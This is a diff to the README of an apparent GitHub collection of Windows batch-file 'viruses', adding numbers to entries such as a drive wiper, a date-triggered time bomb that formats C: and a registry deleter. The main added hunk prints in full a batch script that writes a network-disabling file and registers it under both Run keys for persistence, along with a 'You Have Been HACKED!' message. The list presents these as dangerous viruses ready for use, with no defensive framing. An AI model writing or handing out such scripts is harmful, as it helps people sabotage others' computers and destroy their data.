@@ -24,7 +24,7 @@ The viruses here are mostly very dangerous.
 # The Awesome List of Computer Viruses!
 
 
-### Deletes all content of a drive
+### 1. Deletes all content of a drive
 
 
 <details><summary> Read More </summary>
@@ -42,7 +42,7 @@ shutdown -r -f -t <span class="hljs-number">00</span>
 
 
 
-### Time Bomb Virus, formats C: on 25 November 2023
+### 2. Time Bomb Virus, formats C: on 25 November 2023
 
 
 <details><summary> Read More </summary>
@@ -62,7 +62,7 @@ shutdown -r -f -t <span class="hljs-number">00</span>
 
 
 
-### Crash Ur Computer of Windows Xp
+### 3. Crash Ur Computer of Windows Xp
 
 
 <details><summary> Read More </summary>
@@ -83,7 +83,7 @@ WSHShell.Run “Tourstart.exe”
 
   </details>
 
-### Delete Key Registry Files 
+### 4.  Delete Key Registry Files 
 
 
 
@@ -101,7 +101,7 @@ GOTO MESSAGE
 
   </details>
 
-### The Most Simple Virus To Crush The Window. Delete C:/
+### 5. The Most Simple Virus To Crush The Window. Delete C:/
 
 
 <details><summary> Read More </summary>
@@ -116,7 +116,7 @@ Del C:<span class="hljs-string">\</span> *.* |y
   </details>
  
  
- ### Endless Notepads
+ ### 6. Endless Notepads
 
 
 <details><summary> Read More </summary>
@@ -134,9 +134,27 @@ Del C:<span class="hljs-string">\</span> *.* |y
   </details>
  
 
+### 7. Disable Internet Permanently
 
-virus7.bat
-Disable Internet Permanently
+
+<details><summary> Read More </summary>
+ 
+ <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus7.bat">virus7.bat</a></p>
+<pre><code><span class="hljs-symbol">echo</span> <span class="hljs-comment">@echo off&gt;c:windowswimn32.bat</span>
+<span class="hljs-symbol">echo</span> <span class="hljs-keyword">break </span>off&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
+</span><span class="hljs-symbol">echo</span> ipconfig/release_all&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
+</span><span class="hljs-symbol">echo</span> <span class="hljs-meta">end</span>&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
+</span><span class="hljs-symbol">reg</span> <span class="hljs-keyword">add </span>hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.<span class="hljs-keyword">bat </span>/f
+<span class="hljs-symbol">reg</span> <span class="hljs-keyword">add </span>hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.<span class="hljs-keyword">bat </span>/f
+<span class="hljs-symbol">echo</span> You Have <span class="hljs-keyword">Been </span>HACKED!
+<span class="hljs-symbol">PAUSE</span>
+</code></pre><p>Your device will never ever connect to the internet if this virus runs once!</p>
+  
+  </details>
+ 
+
+
+
 virus8.bat
 crazy caps lock
 virus9.bat
